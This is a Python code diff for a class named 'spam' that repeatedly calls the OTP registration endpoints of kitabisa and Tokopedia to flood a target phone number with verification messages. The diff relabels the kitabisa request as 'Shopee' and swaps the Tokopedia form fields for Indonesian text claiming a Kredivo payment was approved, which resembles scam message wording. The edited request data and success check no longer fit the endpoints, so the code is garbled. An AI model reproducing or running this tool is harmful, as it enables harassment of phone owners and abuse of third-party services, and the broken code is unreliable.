@@ -30,9 +30,9 @@ class spam:
 	def spam(self):
 		hasil=requests.get(f'https://core.ktbs.io/v2/user/registration/otp/{self.nomer}')
 		if hasil.status_code == 200:
-			return f'\x1b[92mSpamm kitabisa {self.nomer} \033[1;32mSuccess!'
+			return f'\x1b[92mSpamm Shopee {self.nomer} \033[1;32mSuccess!'
 		elif hasil.status_code == 500:
-			return f'\x1b[91mSpamm kitabisa {self.nomer} \x1b[91mFail!'
+			return f'\x1b[91mSpamm Shopee {self.nomer} \x1b[91mFail!'
 			
 	def tokped(self):
 		rands=random.choice(open('ua.txt').readlines()).split('\n')[0]
@@ -48,17 +48,11 @@ class spam:
 		regist = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+self.nomer+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = kirim).text
 		Token = re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', regist).group(1)
 		formulir = {
-			"otp_type" : "116",
-			"msisdn" : self.nomer,
-			"tk" : Token,
-			"email" : '',
-			"original_param" : "",
-			"user_id" : "",
-			"signature" : "",
-			"number_otp_digit" : "6"
+			"Pembayaran pesanan anda telah di setujui. ",
+			"Gunakan terus Saldo Kredivo mu agar mendapat kenaikan limit",
 		}
 		req = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = kirim, data = formulir).text
-		if 'Anda sudah melakukan 3 kali pengiriman kode' in req:
+		if 'Pesanan anda sudah dinkonfirmasi, dan pembayaran dengan Kredivo Beli Sekarang Bayar Nanti telah di setujui' in req:
 			return f'\x1b[91mSpamm Tokped {self.nomer} \x1b[91mFail!'
 		else:
 			return f'\x1b[92mSpamm Tokped {self.nomer} {h}Success!'
